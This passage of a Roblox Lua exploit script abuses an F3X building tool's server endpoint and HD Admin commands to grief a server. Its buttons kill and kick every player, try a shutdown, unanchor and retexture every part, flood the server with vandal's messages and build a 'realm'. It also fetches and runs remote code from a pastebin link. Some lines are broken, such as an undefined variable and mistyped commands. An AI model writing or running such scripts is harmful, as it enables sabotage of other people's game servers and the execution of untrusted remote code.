                for _, face in pairs(Enum.NormalId:GetEnumItems()) do
                    runSync({"CreateTextures", {{["Part"] = v, ["Face"] = face, ["TextureType"] = "Decal"}}})
                    runSync({"SyncTexture", {{["Part"] = v, ["Face"] = face, ["TextureType"] = "Decal", ["Texture"] = "rbxassetid://133977560977687"}}})
                end
            end)
        end
    end
    hdCommand(";serverMessage 贴图1已应用!")
end)

makeBtn(scrollFrame, "Decal2", "贴图2").MouseButton1Click:Connect(function()
    for _, v in pairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") then
            task.spawn(function()
                runSync({"SetLocked", {v}, false})
                for _, face in pairs(Enum.NormalId:GetEnumItems()) do
                    runSync({"CreateTextures", {{["Part"] = v, ["Face"] = face, ["TextureType"] = "Decal"}}})
                    runSync({"SyncTexture", {{["Part"] = v, ["Face"] = face, ["TextureType"] = "Decal", ["Texture"] = "rbxassetid://116976014652651"}}})
                end
            end)
        end
    end
    hdCommand(";serverMessage 贴图2已应用!")
end)

makeBtn(scrollFrame, "Decal3", "贴图3").MouseButton1Click:Connect(function()
    for _, v in pairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") then
            task.spawn(function()
                runSync({"SetLocked", {v}, false})
                for _, face in pairs(Enum.NormalId:GetEnumItems()) do
                    runSync({"CreateTextures", {{["Part"] = v, ["Face"] = face, ["TextureType"] = "Decal"}}})
                    runSync({"SyncTexture", {{["Part"] = v, ["Face"] = face, ["TextureType"] = "Decal", ["Texture"] = "rbxassetid://117662518997930"}}})
                end
            end)
        end
    end
    hdCommand(";serverMessage 贴图3已应用!")
end)

makeBtn(scrollFrame, "Decal4", "贴图4").MouseButton1Click:Connect(function()
    for _, v in pairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") then
            task.spawn(function()
                runSync({"SetLocked", {v}, false})
                for _, face in pairs(Enum.NormalId:GetEnumItems()) do
                    runSync({"CreateTextures", {{["Part"] = v, ["Face"] = face, ["TextureType"] = "Decal"}}})
                    runSync({"SyncTexture", {{["Part"] = v, ["Face"] = face, ["TextureType"] = "Decal", ["Texture"] = "rbxassetid://92570079734551"}}})
                end
            end)
        end
    end
    hdCommand(";serverMessage 贴图4已应用!")
end)

-- 5-6. 漂浮图片
makeBtn(scrollFrame, "FloatImage1", "漂浮图片1").MouseButton1Click:Connect(function()
    for _, v in pairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") then
            local billboard = Instance.new("BillboardGui")
            billboard.Name = "Floating_Image"
            billboard.Size = UDim2.new(0, 100, 0, 100)
            billboard.AlwaysOnTop = true
            billboard.StudsOffset = Vector3.new(0, 5, 0)
            billboard.Parent = v
            
            local imageLabel = Instance.new("ImageLabel")
            imageLabel.Size = UDim2.new(1, 0, 1, 0)
            imageLabel.BackgroundTransparency = 1
            imageLabel.Image = "rbxassetid://92570079734551"
            imageLabel.Parent = billboard
        end
    end
    hdCommand(";serverMessage 漂浮图片1已生成!")
end)

makeBtn(scrollFrame, "FloatImage2", "漂浮图片2").MouseButton1Click:Connect(function()
    for _, v in pairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") then
            local billboard = Instance.new("BillboardGui")
            billboard.Name = "Floating_Image"
            billboard.Size = UDim2.new(0, 100, 0, 100)
            billboard.AlwaysOnTop = true
            billboard.StudsOffset = Vector3.new(0, 5, 0)
            billboard.Parent = v
            
            local imageLabel = Instance.new("ImageLabel")
            imageLabel.Size = UDim2.new(1, 0, 1, 0)
            imageLabel.BackgroundTransparency = 1
            imageLabel.Image = "rbxassetid://2108449725"
            imageLabel.Parent = billboard
        end
    end
    hdCommand(";serverMessage 漂浮图片2已生成!")
end)

-- 7-9. 提示功能
makeBtn(scrollFrame, "Hint1", "提示1").MouseButton1Click:Connect(function()
    hdCommand(";shp k00pkidd！😎🤑")
end)

makeBtn(scrollFrame, "Hint2", "提示2").MouseButton1Click:Connect(function()
    hdCommand(";shp K00pkidd无敌")
end)

makeBtn(scrollFrame, "Hint3", "提示3").MouseButton1Click:Connect(function()
    hdCommand(";shp k00pkidd万岁")
end)

-- 10-12. 服务器消息
makeBtn(scrollFrame, "Msg1", "消息1").MouseButton1Click:Connect(function()
    hdCommand(";serverMessage k00pkidd😎")
end)

makeBtn(scrollFrame, "Msg2", "消息2").MouseButton1Click:Connect(function()
    hdCommand(";serverMessage 你好")
end)

makeBtn(scrollFrame, "Msg3", "消息3").MouseButton1Click:Connect(function()
    hdCommand(";shutdwon")
    hdCommand(";serverMessage k00pkidd正在使用HD权限")
end)

-- 13-14. 天空盒
makeBtn(scrollFrame, "Sky1", "天空盒1").MouseButton1Click:Connect(function()
    local function Sky(id)
        local char = player.Character or player.CharacterAdded:Wait()
        local root = char:FindFirstChild("HumanoidRootPart")
        if not root then return end
        
        local cf = root.CFrame
        local pos = CFrame.new(math.floor(cf.X), math.floor(cf.Y), math.floor(cf.Z)) + Vector3.new(0, 6, 0)
        
        runSync({"CreatePart", "Normal", pos, workspace})
        task.wait(0.1)
        
        for _, v in pairs(workspace:GetDescendants()) do
            if v:IsA("BasePart") and math.abs(v.Position.X - pos.X) < 10 and math.abs(v.Position.Z - pos.Z) < 10 then
                runSync({"SetName", {v}, "Skybox"})
                runSync({"CreateMeshes", {{["Part"] = v}}})
                runSync({"SyncMesh", {{["Part"] = v, ["MeshId"] = "rbxassetid://111891702759441"}}})
                runSync({"SyncMesh", {{["Part"] = v, ["TextureId"] = "rbxassetid://"..id}}})
                runSync({"SyncMesh", {{["Part"] = v, ["Scale"] = Vector3.new(7200,7200,7200)}}})
                runSync({"SetLocked", {v}, true})
            end
        end
        
        if game.Lighting:FindFirstChild("Sky") then
            game.Lighting.Sky:Destroy()
        end
    end
    
    Sky("5608410985")
    hdCommand(";time 0")
    hdCommand(";fogcolor black")
end)

makeBtn(scrollFrame, "Sky2", "天空盒2").MouseButton1Click:Connect(function()
    local function Sky(id)
        local char = player.Character or player.CharacterAdded:Wait()
        local root = char:FindFirstChild("HumanoidRootPart")
        if not root then return end
        
        local cf = root.CFrame
        local pos = CFrame.new(math.floor(cf.X), math.floor(cf.Y), math.floor(cf.Z)) + Vector3.new(0, 6, 0)
        
        runSync({"CreatePart", "Normal", pos, workspace})
        task.wait(0.1)
        
        for _, v in pairs(workspace:GetDescendants()) do
            if v:IsA("BasePart") and math.abs(v.Position.X - pos.X) < 10 and math.abs(v.Position.Z - pos.Z) < 10 then
                runSync({"SetName", {v}, "Skybox"})
                runSync({"CreateMeshes", {{["Part"] = v}}})
                runSync({"SyncMesh", {{["Part"] = v, ["MeshId"] = "rbxassetid://111891702759441"}}})
                runSync({"SyncMesh", {{["Part"] = v, ["TextureId"] = "rbxassetid://"..id}}})
                runSync({"SyncMesh", {{["Part"] = v, ["Scale"] = Vector3.new(7200,7200,7200)}}})
                runSync({"SetLocked", {v}, true})
            end
        end
        
        if game.Lighting:FindFirstChild("Sky") then
            game.Lighting.Sky:Destroy()
        end
    end
    
    Sky("12886904144")
    hdCommand(";time 0")
    hdCommand(";fogcolor black")
end)

-- 15. 播放主题音乐
makeBtn(scrollFrame, "ThemeMusic", "主题音乐").MouseButton1Click:Connect(function()
    hdCommand(";music 1839246711")
    hdCommand(";volume inf")
    hdCommand(";pitch 1.0")
    hdCommand(";serverMessage 主题音乐播放中!")
end)

-- 16. 下雨蟾蜍
makeBtn(scrollFrame, "RainToads", "下雨蟾蜍").MouseButton1Click:Connect(function()
    hdCommand(";time 0")
    hdCommand(";fogcolor black")
    
    local tool = getSyncTool()
    if not tool then 
        hdCommand(";serverMessage 未找到F3X工具!")
        return 
    end
    
    local function createRainToads()
        while task.wait(0.3) do
            local char = player.Character
            if char and char:FindFirstChild("HumanoidRootPart") then
                local hrp = char.HumanoidRootPart
                local x = hrp.Position.X + math.random(-200, 200)
                local z = hrp.Position.Z + math.random(-200, 200)
                local y = hrp.Position.Y + 200
                
                runSync({"CreatePart", "Normal", CFrame.new(x, y, z), workspace})
                task.wait(0.05)
                
                for _, v in pairs(workspace:GetDescendants()) do
                    if v:IsA("BasePart") and math.abs(v.Position.X - x) < 5 and math.abs(v.Position.Z - z) < 5 then
                        runSync({"SetName", {v}, "MiniToad"})
                        runSync({"CreateMeshes", {{["Part"] = v}}})
                        runSync({"SyncMesh", {{["Part"] = v, ["MeshId"] = "rbxassetid://7234998844"}}})
                        runSync({"SyncMesh", {{["Part"] = v, ["TextureId"] = "rbxassetid://1009824086"}}})
                        runSync({"SyncCollision", {{Part = v, CanCollide = false}}})
                        v.Anchored = false
                        
                        local bodyForce = Instance.new("BodyForce")
                        bodyForce.Force = Vector3.new(0, -v:GetMass() * workspace.Gravity * 2, 0)
                        bodyForce.Parent = v
                        
                        game:GetService("Debris"):AddItem(v, 5)
                        break
                    end
                end
            end
        end
    end
    
    coroutine.wrap(createRainToads)()
    hdCommand(";serverMessage 下雨蟾蜍已激活!")
end)

-- 17-18. 下雨v2-3
makeBtn(scrollFrame, "RainV2", "下雨v2").MouseButton1Click:Connect(function()
    hdCommand(";music off")
    hdCommand(";time 0")
    hdCommand(";fogcolor 0 0 100")
    
    local function createRain()
        while task.wait(0.2) do
            local char = player.Character
            if char and char:FindFirstChild("HumanoidRootPart") then
                local hrp = char.HumanoidRootPart
                local x = math.random(-300, 300) + hrp.Position.X
                local z = math.random(-300, 300) + hrp.Position.Z
                local y = hrp.Position.Y + 200
                
                runSync({"CreatePart", "Normal", CFrame.new(x, y, z), workspace})
                task.wait(0.1)
                
                for _, v in pairs(workspace:GetDescendants()) do
                    if v:IsA("BasePart") and v.Position.X == x and v.Position.Z == z then
                        runSync({"SetName", {v}, "RainDrop"})
                        runSync({"CreateMeshes", {{["Part"] = v}}})
                        runSync({"SyncMesh", {{["Part"] = v, ["MeshId"] = "rbxassetid://8808550143"}}})
                        runSync({"SyncCollision", {{Part = v, CanCollide = false}}})
                        v.Anchored = false
                        
                        local bodyForce = Instance.new("BodyForce")
                        bodyForce.Force = Vector3.new(0, -v:GetMass() * workspace.Gravity * 3, 0)
                        bodyForce.Parent = v
                        
                        game:GetService("Debris"):AddItem(v, 5)
                        break
                    end
                end
            end
        end
    end
    
    coroutine.wrap(createRain)()
    hdCommand(";serverMessage 下雨v2已激活!")
end)

makeBtn(scrollFrame, "RainV3", "下雨v3").MouseButton1Click:Connect(function()
    hdCommand(";music 95156028272944")
    hdCommand(";volume inf")
    hdCommand(";pitch 0.5")
    hdCommand(";time 0")
    hdCommand(";fogcolor 50 50 50")
    
    local function createRainV3()
        while task.wait(0.15) do
            local char = player.Character
            if char and char:FindFirstChild("HumanoidRootPart") then
                local hrp = char.HumanoidRootPart
                local x = math.random(-400, 400) + hrp.Position.X
                local z = math.random(-400, 400) + hrp.Position.Z
                local y = hrp.Position.Y + 300
                
                runSync({"CreatePart", "Normal", CFrame.new(x, y, z), workspace})
                task.wait(0.1)
                
                for _, v in pairs(workspace:GetDescendants()) do
                    if v:IsA("BasePart") and v.Position.X == x and v.Position.Z == z then
                        runSync({"SetName", {v}, "RainV3"})
                        runSync({"CreateMeshes", {{["Part"] = v}}})
                        runSync({"SyncMesh", {{["Part"] = v, ["MeshId"] = "rbxassetid://6701243463"}}})
                        runSync({"SyncMaterial", {{Part = v, Material = Enum.Material.Neon}}})
                        runSync({"SyncColor", {{Part = v, Color = Color3.fromRGB(0, 150, 255), UnionColoring = false}}})
                        runSync({"SyncCollision", {{Part = v, CanCollide = false}}})
                        v.Anchored = false
                        
                        local bodyForce = Instance.new("BodyForce")
                        bodyForce.Force = Vector3.new(
                            math.random(-500, 500),
                            -v:GetMass() * workspace.Gravity * 5,
                            math.random(-500, 500)
                        )
                        bodyForce.Parent = v
                        
                        game:GetService("Debris"):AddItem(v, 4)
                        break
                    end
                end
            end
        end
    end
    
    coroutine.wrap(createRainV3)()
    hdCommand(";serverMessage 下雨v3已激活!")
end)

-- 19. Disco
makeBtn(scrollFrame, "DiscoAll", "全图Disco").MouseButton1Click:Connect(function()
    hdCommand(";disco")
    
    -- 给所有建筑添加Disco效果
    for _, v in pairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") and v.Name ~= "Terrain" then
            task.spawn(function()
                local discoThread = coroutine.create(function()
                    while task.wait(0.1) do
                        local color = Color3.fromRGB(
                            math.random(0, 255),
                            math.random(0, 255),
                            math.random(0, 255)
                        )
                        runSync({"SyncColor", {{Part = v, Color = color, UnionColoring = false}}})
                    end
                end)
                coroutine.resume(discoThread)
            end)
        end
    end
    
    hdCommand(";serverMessage 全图Disco已激活!")
end)

-- 20. 玩家模型
makeBtn(scrollFrame, "PlayerModel", "玩家模型").MouseButton1Click:Connect(function()
    hdCommand(";char all 5058814486")
    
    -- 给所有玩家道具
    hdCommand(";give all 4710957097")
    
    hdCommand(";serverMessage 玩家模型已更改!")
end)

-- 21. Kill all
makeBtn(scrollFrame, "KillAll", "杀死所有人").MouseButton1Click:Connect(function()
    hdCommand(";kill all")
    hdCommand(";serverMessage k00pkidd处决了所有人!")
end)

-- 22. Kick all
makeBtn(scrollFrame, "KickAll", "踢出所有人").MouseButton1Click:Connect(function()
    hdCommand(";kick all k00pkidd")
    hdCommand(";serverMessage 所有人被踢出!")
end)

-- 23. 聊天框发消息
makeBtn(scrollFrame, "k0pkidd领域", "k00pkidd领域").MouseButton1Click:Connect(function()
            hdCommand(";r6 all")
            hdCommand(";cmdbar2 all")
            hdCommand(";serverMessage k00pkidd已摧毁服务器")
            hdCommand(";btools")
            hdCommand(";fakeDeath all")
            hdCommand(";fast all")
            hdCommand(";chatTag all k00pkidd")
            hdCommand(";chatTagColor all")
            hdCommand(";catName all k00pkidd k00pkidd")
            hdCommand(";catNameColor")
            hdCommand(";systemMessage k00pkidd万岁！🤑🤓😎")
            hdCommand(";alert all k00pkidd大军已入侵！🤑🤓😎")
            hdCommand(";time 0")
            hdCommand(";fog")
            hdCommand(";;music 1839246711")

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
local player = game.Players.LocalPlayer
local char = player.Character
local backpack = player.Backpack

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	return nil
end

local f3x = getf3x()
if not f3x then
	warn("you dont have f3x skid")
end
local syncapi = f3x.SyncAPI
local serverendpoint = syncapi.ServerEndpoint

function _(args)
    serverendpoint:InvokeServer(unpack(args))
end



function MovePart(part, cf)
    local args = {
        "SyncMove",
        {
            {
                Part = part,
                CFrame = cf
            }
        }
    }
    _(args)
end

local function resize(part, size, cf)
	local args = {
		"SyncResize",
		{
			{
				Part = part,
				CFrame = cf,
				Size = size
			}
		}
	}
	_(args)
end

local function mat(part, mate)
	local args = {
		"SyncMaterial",
		{
			{
				Part = part,
				Material = mate
			}
		}
	}
	_(args)
end
local function light(part)


	local createArgs = {
		"CreateLights",
		{
			{
				Part = part,
				LightType = "PointLight"
			}
		}
	}


	local syncArgs = {
		"SyncLighting",
		{
			{
				Part = part,
				LightType = "PointLight",
				Color = Color3.fromRGB(255, 255, 255),
				Range = 50,
			}
		}
	}

	_(createArgs)
	_(syncArgs)
end
local function transparency(part, trans)
	local args = {
		"SyncMaterial",
		{
			{
				Part = part,
				Transparency = trans
			}
		}
	}
	_(args)
end

local function color(part, color)
	local args = {
		"SyncColor",
		{
			{
				Part = part,
				Color = color,
				UnionColoring = false
			}
		}
	}
	_(args)
end

local function syncmeshid(part, id)
	local args = {
		"SyncMesh",
		{
			{
				Part = part,
				MeshId = "rbxassetid://" .. id
			}
		}
	}
	_(args)
end

local function makemesh(part)
	local args = {
		"CreateMeshes",
		{
			{
				Part = part
			}
		}
	}
	_(args)
end

local function syncmeshsize(part, vectora)
	local args = {
		"SyncMesh",
		{
			{
				Part = part,
				Scale = vectora
			}
		}
	}
	_(args)
end

local function syncmeshtexture(part, id)
	local args = {
		"SyncMesh",
		{
			{
				Part = part,
				TextureId = "rbxassetid://" .. id
			}
		}
	}
	_(args)
end

local function name(part, stringa)
	local args = {
		"SetName",
		{ part },
		stringa
	}
	_(args)
end

local function lock(part, boolean)
	local args = {
		"SetLocked",
		{ part },
		boolean
	}
	_(args)
end

local function setcollision(part, booleana)
	local args = {
		"SyncCollision",
		{
			{
				Part = part,
				CanCollide = booleana
			}
		}
	}
	_(args)
end

local function setanchor(part, boolean)
	local args = {
		"SyncAnchor",
		{
			{
				Part = part,
				Anchored = boolean
			}
		}
	}
	_(args)
end

local function createtexture(part, side)
	local args = {
		"CreateTextures",
		{
			{
				Part = part,
				Face = side,
				TextureType = "Texture"
			}
		}
	}
	_(args)
end

local function createdecal(part, side)
	local args = {
		"CreateTextures",
		{
			{
				Part = part,
				Face = side,
				TextureType = "Decal"
			}
		}
	}
	_(args)
end
local function setdecal(part, asset, side)
	local args = {
		"SyncTexture",
		{
			{
				Part = part,
				Face = side,
				TextureType = "Decal",
				Texture = "rbxassetid://" .. asset
			}
		}
	}
	_(args)
end

		function floor(part, face)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = face,
						["TextureType"] = "Texture",
						["Texture"] = "rbxassetid://135172958780980",
						["StudsPerTileV"] = 2,
						["StudsPerTileU"] = 2
					}
				}
			}
			_(args)
		end
		function getwooded(part, face)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = face,
						["TextureType"] = "Texture",
						["Texture"] = "rbxassetid://94153618",
						["StudsPerTileV"] = 10,
						["StudsPerTileU"] = 10
					}
				}
			}
			_(args)
		end
        
function getFlooredLMFAO(part, face)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = face,
						["TextureType"] = "Texture",
						["Texture"] = "rbxassetid://55420352",
						["StudsPerTileV"] = 10,
						["StudsPerTileU"] = 10
					}
				}
			}
			_(args)
		end
        
  
local function RealmV2()
	local position = CFrame.new(-47.979, 0, -26.237)
	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
	resize(base, Vector3.new(63, 1, 66), position)
color(base, Color3.fromRGB(230, 230, 230))
createtexture(base, Enum.NormalId.Top)
getFlooredLMFAO(base, Enum.NormalId.Top)

	local position = CFrame.new(-67.979, 2.25, -34.687)
	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
	resize(base, Vector3.new(23, 5.5, 1.1), position)
  color(base, Color3.fromRGB(10, 10, 10))
  mat(base, Enum.Material.WoodPlanks)

	local position = CFrame.new(-67.979, 9, -34.737)
	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
	resize(base, Vector3.new(23, 19, 1), position)
color(base, Color3.fromRGB(46, 46, 46))

local position = CFrame.new(-67.979, 9, -46.437)
	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
	resize(base, Vector3.new(23, 19, 24.4), position)
  color(base, Color3.fromRGB(46, 46, 46))

local position = CFrame.new(-47.979, 9, -58.737)
	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
	resize(base, Vector3.new(63, 19, 1), position)
  color(base, Color3.fromRGB(46, 46, 46))
  createtexture(base, Enum.NormalId.Back)
  getwooded(base, Enum.NormalId.Back)

local position = CFrame.new(-15.979, 9, -26.237)
	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
	resize(base, Vector3.new(1, 19, 66), position)
  color(base, Color3.fromRGB(46, 46, 46))
    createtexture(base, Enum.NormalId.Left)
  getwooded(base, Enum.NormalId.Left)

local position = CFrame.new(-79.979, 9, -26.237)
	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
	resize(base, Vector3.new(1, 19, 66), position)
  color(base, Color3.fromRGB(46, 46, 46))
  createtexture(base, Enum.NormalId.Right)
  getwooded(base, Enum.NormalId.Right)

local position = CFrame.new(-20.979, 15, 6.263)
	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
	resize(base, Vector3.new(11, 7, 1), position)
  color(base, Color3.fromRGB(46, 46, 46))

local position = CFrame.new(-25.479, 9, 6.263)
	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
	resize(base, Vector3.new(2, 19, 1), position)
  color(base, Color3.fromRGB(46, 46, 46))

local position = CFrame.new(-52.479, 1.5, 6.263)
	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
	resize(base, Vector3.new(56, 4, 1), position)
  color(base, Color3.fromRGB(46, 46, 46))
 createtexture(base, Enum.NormalId.Front)
  getwooded(base, Enum.NormalId.Front)

local position = CFrame.new(-49.979, 8.5, 6.613)
	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
	resize(base, Vector3.new(47, 10, 0.1), position)
  color(base, Color3.fromRGB(52, 216, 235))
  transparency(base, 0.7)
  mat(base, Enum.Material.Glass)


  local position = CFrame.new(-76.479, 9, 6.263)
	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
	resize(base, Vector3.new(6, 19, 1), position)
  color(base, Color3.fromRGB(46, 46, 46))


  local position = CFrame.new(-47.979, 19, -26.237)
	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
	resize(base, Vector3.new(63, 1, 66), position)
  color(base, Color3.fromRGB(46, 46, 46))
  light(base)
local position = CFrame.new(-20.479, 6.05, 6.263)
	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
	resize(base, Vector3.new(8, 10.9, 1), position)
  color(base, Color3.fromRGB(52, 216, 235))
  transparency(base, 0.7)
  setcollision(base, false)
  mat(base, Enum.Material.Glass)


local position = CFrame.new(-25.28, 1.4, -34.805)
	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
	resize(base, Vector3.new(15.7, 4.2, 2), position)
  color(base, Color3.fromRGB(0, 0, 0))

local position = CFrame.new(-49.78, 1.75, -34.805)
	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
	resize(base, Vector3.new(13.5, 3.5, 2), position)
  color(base, Color3.new(1, 1, 1))
  
  local koopPos = CFrame.new(-26.896, 5, -37.605)
	local U00lckid = serverendpoint:InvokeServer("CreatePart", "Normal", koopPos, workspace.Terrain)
resize(U00lckid, Vector3.new(8, 10, 2), koopPos)
makemesh(U00lckid)
syncmeshid(U00lckid, "7879233630")
syncmeshtexture(U00lckid, "122599551209854")
syncmeshsize(U00lckid,Vector3.new(2, 2, 2))
MovePart(U00lckid, U00lckid.CFrame * CFrame.Angles(0, math.rad(-179.997), 0))

local position = CFrame.new(-26.944, 13.05, -37.165)
local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
	resize(base, Vector3.new(16.5, 14.1, 0.1), position)
  transparency(base, 1)
  setcollision(base, false)
  createdecal(base, Enum.NormalId.Back)
  setdecal(base, "101691977267262", Enum.NormalId.Back)

createdecal(bubblechat, Enum.NormalId.Front)
setdecal(bubblechat, "102002754753325", Enum.NormalId.Front)
setcollision(bubblechat, false)

 local position = CFrame.new(-38.13, 3.1, -35.755)
	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
	resize(base, Vector3.new(10, 6.2, 0.1), position)
  color(base, Color3.new(1, 1, 1))

local position = CFrame.new(-38.13, 5.15, -34.805)
	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
	resize(base, Vector3.new(10, 0.3, 2), position)
  color(base, Color3.new(1, 1, 1))

local position = CFrame.new(-38.13, 3.15, -34.805)
	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
	resize(base, Vector3.new(10, 0.3, 2), position)
  color(base, Color3.new(1, 1, 1))

local position = CFrame.new(-38.13, 0.75, -34.805)
	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
	resize(base, Vector3.new(10, 1.5, 2), position)
  color(base, Color3.new(1, 1, 1))

local pos8 = CFrame.new(-30.818, 2.5, 0.635)
	local door = serverendpoint:InvokeServer("CreatePart", "Normal", pos8, workspace)
makemesh(door)
syncmeshid(door, "108885615243219")
color(door, Color3.fromRGB(10, 10, 10))
MovePart(door, door.CFrame * CFrame.Angles(0, math.rad(90), 0))



local pos8 = CFrame.new(-45.818, 2.5, 0.635)
	local door = serverendpoint:InvokeServer("CreatePart", "Normal", pos8, workspace)
makemesh(door)
syncmeshid(door, "108885615243219")
color(door, Color3.fromRGB(10, 10, 10))
MovePart(door, door.CFrame * CFrame.Angles(0, math.rad(90), 0))


local pos8 = CFrame.new(-61.818, 2.5, 0.635)
	local door = serverendpoint:InvokeServer("CreatePart", "Normal", pos8, workspace)
makemesh(door)
syncmeshid(door, "108885615243219")
color(door, Color3.fromRGB(10, 10, 10))
MovePart(door, door.CFrame * CFrame.Angles(0, math.rad(90), 0))




local Koohat = CFrame.new(-21.579, 4.744, -35.271)
	local hat1 = serverendpoint:InvokeServer("CreatePart", "Normal", Koohat, workspace)
makemesh(hat1)
syncmeshid(hat1, "10970208924")
syncmeshsize(hat1, Vector3.new(0.005, 0.005, 0.005))
syncmeshtexture(hat1, "10970209066")



local position = CFrame.new(-51.479, 8, 6.263)
	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
	resize(base, Vector3.new(50, 1, 1), position)
  color(base, Color3.fromRGB(46, 46, 46))
  createtexture(base, Enum.NormalId.Front)
  getwooded(base, Enum.NormalId.Front)

local position = CFrame.new(-62.979, 9, 6.263)
	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
	resize(base, Vector3.new(1, 19, 1), position)
  color(base, Color3.fromRGB(46, 46, 46))
  createtexture(base, Enum.NormalId.Front)
  getwooded(base, Enum.NormalId.Front)
  
  local pos7 = CFrame.new(-0.703, 6.164, 7.43)
	local text2 = serverendpoint:InvokeServer("CreatePart", "Normal", pos7, workspace)
setcollision(text2, false)
resize(text2, Vector3.new(29, 14, 1), pos7)
transparency(text2, 1)
createdecal(text2, Enum.NormalId.Back)
setdecal(text2, "125792104590827", Enum.NormalId.Back)

local position = CFrame.new(-49.979, 16, 6.263)
	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
	resize(base, Vector3.new(51, 5, 1), position)
  color(base, Color3.fromRGB(46, 46, 46))
  createtexture(base, Enum.NormalId.Front)
  getwooded(base, Enum.NormalId.Front)

local position = CFrame.new(-53.479, 13.5, 10.129)
	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
	resize(base, Vector3.new(54, 1, 9), position)
  color(base, Color3.fromRGB(5, 5, 5))

local position = CFrame.new(-76.429, 16.393, 8.886)
	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
	resize(base, Vector3.new(0.1, 7.4, 0.1), position)
  color(base, Color3.new(1, 1, 1))
MovePart(base, base.CFrame * CFrame.Angles(math.rad(-44.998), 0, 0))


local position = CFrame.new(-57.329, 16.393, 8.886)
	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
	resize(base, Vector3.new(0.1, 7.4, 0.1), position)
  color(base, Color3.new(1, 1, 1))
MovePart(base, base.CFrame * CFrame.Angles(math.rad(-44.998), 0, 0))

local position = CFrame.new(-37.829, 16.393, 8.886)
	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
	resize(base, Vector3.new(0.1, 7.4, 0.1), position)
  color(base, Color3.new(1, 1, 1))
MovePart(base, base.CFrame * CFrame.Angles(math.rad(-44.998), 0, 0))

local position = CFrame.new(-25.479, 11, 7.763)
	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
	resize(base, Vector3.new(2, 23, 4), position)
  color(base, Color3.fromRGB(46, 46, 46))

local position = CFrame.new(-16.479, 11, 7.763)
	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
	resize(base, Vector3.new(2, 23, 4), position)
  color(base, Color3.fromRGB(46, 46, 46))

local position = CFrame.new(-20.979, 17, 7.763)
	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
	resize(base, Vector3.new(11, 11, 4), position)
  color(base, Color3.fromRGB(46, 46, 46))

local position = CFrame.new(-50.369, -0.436, -27.163)
	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
	resize(base, Vector3.new(84.7, 0.8, 95.4), position)
  mat(base, Enum.Material.Concrete)

local position = CFrame.new(-41.816, -0.836, -9.237)
	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
	resize(base, Vector3.new(504, 1, 474), position)
  createtexture(base, Enum.NormalId.Top)
  floor(base, Enum.NormalId.Top)


end

function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
local function unanchorall()
	for _, v in ipairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") or v:IsA("UnionOperation") then
			spawn(function()
        lock(v, false)
				setanchor(v, false)
			end)
		end
	end
end

local function realm()
	unanchorall()
	wait(10)

	RealmV2()
loadstring(game:HttpGet("https://pastebin.com/raw/qh3RikUB"))()

  
end
realm()

RequestCommand:InvokeServer(";music 103439408444041")
wait(5)
RequestCommand:InvokeServer(";time 0 ;fogcolor black ;music 1846575559 ;SM The u00lc's world team tour realm (coffee shop) By U00LCkidd")

RequestCommand:InvokeServer(";createteam red U00LCkidd realm")
    RequestCommand:InvokeServer(";createteam blue U00LCkidd realm")
    RequestCommand:InvokeServer(";createteam db U00LCkidd realm")
    RequestCommand:InvokeServer(";createteam green U00LCkidd realm")
    RequestCommand:InvokeServer(";createteam dg U00LCkidd realm")
    InvokeServer(";createteam pk U00LCkidd realm")
    RequestCommand:InvokeServer(";createteam p U00LCkidd realm")
    RequestCommand:InvokeServer(";createteam y U00LCkidd realm")
